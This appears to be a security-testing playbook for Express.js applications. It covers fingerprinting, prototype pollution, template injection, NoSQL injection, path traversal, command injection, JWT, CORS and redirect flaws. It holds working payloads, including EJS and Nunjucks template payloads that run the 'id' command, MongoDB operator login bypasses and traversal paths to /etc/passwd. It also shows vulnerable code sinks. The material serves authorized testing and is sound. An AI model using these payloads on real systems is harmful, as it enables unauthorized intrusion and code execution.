---
name: express
description: Security testing playbook for Express.js applications covering prototype pollution, template engine SSTI, NoSQL injection, and middleware auth gaps
---

# Express.js

Security testing for Express.js (and Koa/Connect-based) applications. Focus on prototype pollution via body parsing, template engine injection, NoSQL operator injection, middleware ordering gaps, and the ecosystem's rely-on-npm-for-everything security model.

## Attack Surface

**Core Components**
- Routing: `app.get/post/...`, `express.Router()`, parameter handlers, method overrides
- Middleware stack: body-parser/`express.json()`, cookie-parser, session, CORS, helmet
- Template engines: Pug, EJS, Handlebars, Nunjucks (each with distinct SSTI surface)
- Static files: `express.static()` directory serving

**Data Handling**
- `req.query` (qs-parsed, nested objects by default), `req.body`, `req.params`, `req.cookies`
- MongoDB/Mongoose (common), Sequelize, Knex, TypeORM, Prisma
- File uploads via multer, busboy, formidable

**Auth & Session**
- `express-session` (server-side, `connect.sid` cookie), `cookie-session` (client-side signed)
- Passport.js strategies, JWT via `jsonwebtoken`/`express-jwt`
- OAuth integrations, API key middleware

**Deployment**
- Node.js direct, PM2, behind nginx/Cloudflare
- `NODE_ENV` not set to `production` (verbose errors, unminified stacks)
- `X-Powered-By: Express` enabled by default

## High-Value Targets

- Routes accepting nested JSON objects without schema validation (prototype pollution, NoSQL injection)
- Template-rendering endpoints where user input reaches template context or source
- File upload/download endpoints with user-controlled paths
- Authentication middleware relying on `req.query`/`req.body` structure (operator injection)
- Admin routes behind middleware that can be bypassed via path normalization
- WebSocket endpoints (socket.io) sharing auth state with HTTP inconsistently
- Endpoints calling `child_process.exec/spawn` with user input

## Reconnaissance

**Fingerprinting**
```
curl -sI https://target/
# X-Powered-By: Express  (unless helmet disables it)
# Set-Cookie: connect.sid=s%3A...  (express-session)
# ETag format: W/"<hex>-<hex>"  (Express default ETag)

curl -s https://target/nonexistent
# Express default 404: "Cannot GET /nonexistent" (HTML) or {"error":"Not Found"} (JSON)
# With error handler: custom page, but stack traces if NODE_ENV != 'production'
```

**Error Page Leakage**
```
GET /nonexistent           # "Cannot GET /path" reveals Express
POST /existing-get-route   # "Cannot POST /path" confirms route exists for GET
GET /existing?foo[__proto__][test]=1  # observe side effects
```
Stack traces in non-production mode leak file paths, dependency versions, and middleware order.

## Key Vulnerabilities

### Prototype Pollution

The highest-impact Express-ecosystem vulnerability class. The `qs` query string parser (used by Express for `req.query`) parses nested objects by default, enabling `__proto__` pollution via query parameters.

**Via query string (qs)**
```
GET /search?__proto__[isAdmin]=true
GET /search?constructor[prototype][isAdmin]=true
```
Express ≥4.17.1 blocks `__proto__` in qs by default (`parameterLimit`), but `constructor.prototype` may still work depending on qs version and configuration.

**Via body parsing**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
`express.json()` (JSON.parse) does not pollute by itself, but if the parsed object is later merged via `Object.assign`, lodash `_.merge`/`_.defaultsDeep`, or similar deep-merge utilities, pollution propagates.

**Impact**: polluted properties on `Object.prototype` affect all objects — auth bypass (`req.user.isAdmin`), template injection (polluting template options), RCE via child_process options (`shell`, `env`).

Cross-ref: `prototype_pollution` for gadget chains and exploitation techniques.

### Template Engine Injection

Each template engine has distinct SSTI surface:

**EJS**
```javascript
// Vulnerable: user input in template options or inline
res.render('page', {user: req.query.name})  // safe if template is static
ejs.render(userInput, data)                 // SSTI if source is user-controlled
// Via prototype pollution: pollute opts.outputFunctionName or opts.escapeFunction
```
EJS RCE via prototype pollution of `outputFunctionName`:
```
?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');//
```

**Pug (Jade)**
```javascript
// Pug compiles to JS — code injection if template source is user-controlled
pug.render(userInput)  // direct SSTI
```

**Nunjucks**
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

Cross-ref: `ssti` for template engine fingerprinting and polyglot payloads.

### NoSQL Injection (MongoDB/Mongoose)

Express's `qs` parser delivers objects from query strings, enabling MongoDB operator injection:
```
GET /users?username=admin&password[$gt]=    → {password: {$gt: ""}} matches any password
GET /users?username[$ne]=x                  → matches all usernames except "x"
GET /login?username=admin&password[$regex]=^a  → blind extraction via regex
```

In `req.body` with JSON:
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
```

Mongoose's `sanitize` option (`mongoose.set('sanitizeFilter', true)`) and `mongo-sanitize` middleware strip operators, but only when applied.

Cross-ref: `nosql_injection` for operator injection payloads and blind extraction.

### Path Traversal

**`res.sendFile()`**
```javascript
// Vulnerable: user path without root option
res.sendFile(req.query.file)              // absolute path traversal
res.sendFile(req.query.file, {root: '.'}) // relative — but ../ still possible
```

**`express.static()`**
```
GET /../../../etc/passwd          # traversal out of static root
GET /%2e%2e/%2e%2e/etc/passwd    # encoded traversal
GET /..%5c..%5cetc/passwd        # backslash on Windows
```
`express.static` uses `send` which validates paths, but misconfigurations (symlinks, broad root) and URL-encoded bypasses remain testable.

Cross-ref: `path_traversal_lfi_rfi` for encoding and OS-specific traversal techniques.

### Command Injection

```javascript
const {exec} = require('child_process');
exec(`convert ${req.body.filename} output.pdf`);  // shell injection
exec(`ping ${req.query.host}`);                    // direct sink
```

`child_process.exec` runs via shell; `execFile`/`spawn` without `shell: true` are safer but still injectable via argument manipulation. Prototype pollution can inject `shell: true` or `env` properties into spawn options.

Cross-ref: `rce` for command injection payloads and shell metacharacter bypasses.

### JWT & Session Weaknesses

**jsonwebtoken pitfalls**
- `algorithms` not pinned: HS256/RS256 confusion — sign with the public key as HMAC secret
- `none` algorithm accepted if `algorithms` array is unset
- Weak HMAC secrets brute-forceable with `jwt_tool` or `hashcat`
- Missing `issuer`/`audience` validation enabling cross-service token reuse

**express-session**
- `secret` used for cookie signing — weak secret allows forgery of `connect.sid`
- `resave: true` with concurrent requests causes session race conditions
- `cookie.secure` not set on HTTPS sites; `sameSite` missing

Cross-ref: `authentication_jwt` for JWT attack techniques and algorithm confusion.

### CORS Misconfiguration

```javascript
// Dangerous patterns
app.use(cors({origin: true}))                    // reflects any origin
app.use(cors({origin: req.headers.origin}))      // dynamic reflection
app.use(cors({origin: /example\.com/}))          // regex allows evil-example.com
app.use(cors({credentials: true, origin: '*'}))  // credentials with wildcard
```

Test: send requests with `Origin: https://attacker.com` and check `Access-Control-Allow-Origin` reflection with `Access-Control-Allow-Credentials: true`.

Cross-ref: `cors_misconfiguration` for CORS bypass patterns.

### Open Redirect

```javascript
res.redirect(req.query.next)              // unvalidated redirect target
res.redirect(req.query.url)               // common in login/OAuth flows
```
Test: `/login?next=//attacker.com`, `/login?next=https://attacker.com`, protocol-relative URLs.

Cross-ref: `open_redirect` for redirect bypass techniques.

## Bypass Techniques

- Content-type switching: `application/json` vs `application/x-www-form-urlencoded` (different parsers, different pollution surface)
- HTTP method override: `X-HTTP-Method-Override` header or `_method` query param (if `methodOverride` middleware is present)
- Path normalization: `/admin/` vs `/admin` vs `/Admin` vs `/admin/.` — middleware matcher vs route handler differences
- Parameter pollution: `?id=1&id=2` — `req.query.id` becomes an array, breaking string comparisons in auth checks
- Case sensitivity: Express routes are case-sensitive by default (`/Admin` ≠ `/admin`), but middleware matchers may not be

## Testing Methodology

1. **Fingerprint** — Identify Express via `X-Powered-By`, `connect.sid`, error page format
2. **Middleware audit** — Map which middleware runs on which routes; identify gaps in auth middleware coverage
3. **Prototype pollution** — Test `__proto__` and `constructor.prototype` injection via query and body on all endpoints
4. **NoSQL injection** — Send operator objects (`$gt`, `$ne`, `$regex`) in query and body parameters reaching MongoDB
5. **Template probing** — Identify template engine; inject `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` per engine
6. **Auth matrix** — Test each route across unauthenticated, user, and admin roles
7. **Path traversal** — Test file-serving endpoints with encoded traversal sequences
8. **CORS** — Send cross-origin requests with `Origin` header to identify reflection/misconfiguration

## Validation Requirements

- Prototype pollution: demonstrate polluted property on `Object.prototype` affecting application behavior (auth bypass, RCE)
- NoSQL injection: authentication bypass or data extraction via operator injection
- SSTI: code execution confirmed via template engine evaluation (`7*7`→`49`, or `id` command output)
- Path traversal: file contents from outside intended directory
- Command injection: OS command output in response or out-of-band callback
- Auth bypass: side-by-side requests showing unauthorized access with and without middleware
- CORS: cross-origin credentialed request receiving sensitive data with reflected origin
